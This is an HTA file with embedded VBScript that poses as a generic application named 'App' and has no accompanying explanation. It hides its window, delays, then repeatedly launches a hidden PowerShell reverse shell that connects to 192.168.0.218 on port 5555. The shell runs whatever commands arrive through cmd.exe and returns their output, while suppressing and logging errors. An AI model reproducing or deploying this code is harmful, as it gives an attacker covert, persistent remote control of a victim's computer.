<html>
<head>
    <title>App</title>
    <hta:application
        id="app"
        applicationName="App"
        singleInstance="yes"
        windowState="minimize"
        showInTaskbar="no">
    <script language="VBScript">
        On Error Resume Next
        Set shell = CreateObject("WScript.Shell")
        Set fs = CreateObject("Scripting.FileSystemObject")
        logPath = fs.GetSpecialFolder(2) & "\p.txt"

        
        WScript.Sleep 600000

        
        Do While True
            
            cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""try { $stream = (New-Object Net.Sockets.TCPClient('192.168.0.218',5555)).GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer,0,$buffer.Length)) -ne 0) { $data = (New-Object Text.ASCIIEncoding).GetString($buffer,0,$i).Trim(); try { Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $data -NoNewWindow -RedirectStandardOutput ($env:TEMP + '\out.txt') -RedirectStandardError ($env:TEMP + '\err.txt'); Start-Sleep -Milliseconds 500; if (Test-Path ($env:TEMP + '\out.txt')) { $out = Get-Content ($env:TEMP + '\out.txt') -Raw -ErrorAction SilentlyContinue } else { $out = '' }; if (Test-Path ($env:TEMP + '\err.txt')) { $err = Get-Content ($env:TEMP + '\err.txt') -Raw -ErrorAction SilentlyContinue } else { $err = '' }; $result = $out + $err + 'Command executed'; Remove-Item ($env:TEMP + '\out.txt') -ErrorAction SilentlyContinue; Remove-Item ($env:TEMP + '\err.txt') -ErrorAction SilentlyContinue; $outputBytes = ([text.encoding]::ASCII).GetBytes($result); $stream.Write($outputBytes,0,$outputBytes.Length); $stream.Flush() } catch { $result = 'Err: ' + $_.Exception.Message; $outputBytes = ([text.encoding]::ASCII).GetBytes($result); $stream.Write($outputBytes,0,$outputBytes.Length); $stream.Flush() } } } catch { Add-Content -Path '" & logPath & "' -Value ('Err: ' + $_.Exception.Message) }"""

            
            shell.Run cmd, 0, True

            
            If Err.Number <> 0 Then
                Set logFile = fs.OpenTextFile(logPath, 8, True)
                logFile.WriteLine "Err: " & Err.Description & " (Code: " & Err.Number & ") at " & Now
                logFile.Close
            End If

           
            WScript.Sleep 300000
        Loop
    </script>
</head>
<body></body>
</html>
